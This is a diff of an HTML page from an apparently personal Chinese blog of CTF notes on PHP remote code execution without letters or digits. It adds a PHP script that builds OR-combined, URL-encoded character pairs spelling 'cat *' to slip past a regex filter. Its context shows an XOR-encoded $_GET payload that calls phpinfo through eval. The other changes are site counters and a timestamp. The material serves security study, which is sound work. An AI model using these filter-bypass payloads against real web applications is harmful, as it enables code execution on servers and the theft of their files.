@@ -98,7 +98,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;guestbook&#x2F;index&#x2F;1590979582264.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;guestbook&#x2F;index&#x2F;1590982129653.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;guestbook&#x2F;index&#x2F;1590998170346.png">
-<meta property="og:updated_time" content="2020-06-02T00:59:10.076Z">
+<meta property="og:updated_time" content="2020-10-04T05:49:46.943Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;guestbook&#x2F;index&#x2F;1.png">
 
@@ -765,6 +765,11 @@ nl      类似于cat -n，显示时输出行号</code></pre><p>过滤了<code>/<
 
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意<span class="number">1</span>:在测试过程中发现问题，类似phpinfo();的,需要将后面的();放在第个参数的后面,例如url?a=<span class="string">&#123;_GET&#125;</span><span class="string">&#123;b&#125;</span>();&amp;b=phpinfo,也就是?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo,在传入后实际上为$&#123;????^????&#125;&#123;?&#125;();但是到了<span class="keyword">eval</span>()函数内部就会变成$&#123;_GET&#125;&#123;?&#125;();成功执行。注意<span class="number">2</span>:测试中发现,传值时对于要计算的部分不能用括号括起来,因为括号也将被识别为传入的字符串,可以使用&#123;&#125;代替,原因是php的<span class="keyword">use</span> of undefined constant特性,例如$&#123;_GET&#125;<span class="string">&#123;a&#125;</span>这样的语句php是不会判为错误的,因为&#123;&#125;使用来界定变量的,这句话就是会将_GET自动看为字符串,也就是$_GET[<span class="string">'a'</span>]</span><br></pre></td></tr></table></figure>
 
+<p>与或脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"cat *"</span>;</span><br><span class="line">$k=<span class="number">0</span>;</span><br><span class="line">$a = <span class="string">""</span>;</span><br><span class="line">$b = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span>($k&lt;<span class="number">20</span>)&#123;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++)&#123; </span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++)&#123; </span><br><span class="line">			$preg = <span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span>;</span><br><span class="line">			<span class="keyword">if</span>(!preg_match($preg ,chr($i)) &amp;&amp; !preg_match($preg , chr($j)))&#123;</span><br><span class="line">				$c=(chr($i)|chr($j));</span><br><span class="line">				<span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">					$contents=$c.<span class="string">" "</span>.urlencode(chr($i)).<span class="string">" "</span>.urlencode(chr($j)).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">					<span class="keyword">if</span>(substr($payload,$k,<span class="number">1</span>)==$c)&#123;</span><br><span class="line">						<span class="keyword">echo</span> $contents;</span><br><span class="line">						$k++;</span><br><span class="line">						$a=$a.urlencode(chr($i));</span><br><span class="line">						$b=$b.urlencode(chr($j));</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$res = <span class="string">"'$a'"</span>.<span class="string">"|"</span>.<span class="string">"'$b'"</span>;</span><br><span class="line">$res = str_replace(<span class="string">'%10+'</span>,<span class="string">""</span>,$res);</span><br><span class="line">$res = str_replace(<span class="string">'+%10'</span>,<span class="string">""</span>,$res);</span><br><span class="line">$res = str_replace(<span class="string">'+'</span>,<span class="string">"%20"</span>,$res);<span class="comment">//将加号替换为空格%20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $res;			<span class="comment">//最候的结果可能需要自己手动删除最后几个字符</span></span><br></pre></td></tr></table></figure>
+
+
+
 <p><strong>一些无数字字母rce的payload</strong></p>
 <p>异或</p>
 <blockquote>
@@ -983,7 +988,7 @@ nl      类似于cat -n，显示时输出行号</code></pre><p>过滤了<code>/<
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">67</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -996,7 +1001,7 @@ nl      类似于cat -n，显示时输出行号</code></pre><p>过滤了<code>/<
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1178,7 +1183,7 @@ show_date_time();
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">165.7k</span>
+    <span title="Site words total count">173.2k</span>
   
 
 </div>
@@ -1205,7 +1210,7 @@ show_date_time();
     <!-- 博客字数统计 -->
     <span class="site-pv">
       <i class="fa fa-pencil"></i>
-      博客全站共： <span class="post-count">165.7k</span> 字
+      博客全站共： <span class="post-count">173.2k</span> 字
     </span>
 	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
 </div>
